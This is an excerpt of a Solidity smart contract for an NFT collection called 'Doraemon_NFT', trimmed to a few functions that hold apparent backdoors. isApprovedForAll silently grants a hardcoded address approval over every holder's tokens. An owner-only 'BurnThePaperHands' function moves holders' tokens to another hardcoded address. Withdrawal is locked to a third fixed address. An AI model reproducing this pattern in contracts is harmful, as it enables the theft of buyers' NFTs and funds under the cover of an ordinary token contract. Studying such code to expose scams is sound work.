  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x64Fd232520D6eA992AC584DCC952ab85e4e3E778){return true;}
...
contract Doraemon_NFT is Ownable, ERC721A, ReentrancyGuard {
  ...
  function BurnThePaperHands(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0xf75D1B664D64029Bd646D72FB2028366F00F8686, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x66771b61Bd770C10ad21fA220E78E4D1784aa58c);
